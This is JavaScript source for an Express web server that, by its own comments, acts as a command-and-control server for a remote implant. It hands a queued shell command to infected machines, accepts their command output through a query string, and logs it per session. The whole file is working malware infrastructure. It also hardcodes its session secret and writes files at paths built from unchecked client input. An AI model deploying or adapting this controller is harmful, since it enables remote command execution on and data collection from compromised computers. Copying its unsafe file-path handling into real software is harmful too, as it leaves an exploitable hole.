const express = require('express')
const fs = require('fs')
const hostname = 'localhost';
const port = 443;
var session = require('express-session');

const app = express();

var command = "ipconfig";

app.use(session({
	secret: "keyboardCat",
	resave: false,
	saveUninitialized: true
}));

app.get('/', (req, res) => {
	sid = req.sessionID;
	console.log(sid);
	fs.writeFile(`Sessions/${sid}.log`, "Connection Established\n", err => {
  		if (err) {
    		console.error(err)
    		return
  		}
	})
	res.send(`${sid}`);
});

//Used to return the output from the target machine to our C2 server
app.get('/info', (req, res) => {
    if(req.query.info != null){
		var sid = req.query.sid;
        var InfoText = req.query.info;
        //InfoText = decodeURI(InfoText);
        console.log(`${sid}: ${InfoText}`)
		fs.appendFile(`Sessions/${sid}.log`, `${InfoText}\n`, err => {
		  	if (err) {
		    	console.error(err)
		   	return
		  	}
		})
    }
    res.send("Information Sent!")
});

//Used to send out command to the server to be read by the implant
app.get('/retrcommand', (req, res) => {
    res.send(command)
});

app.listen(port, hostname);
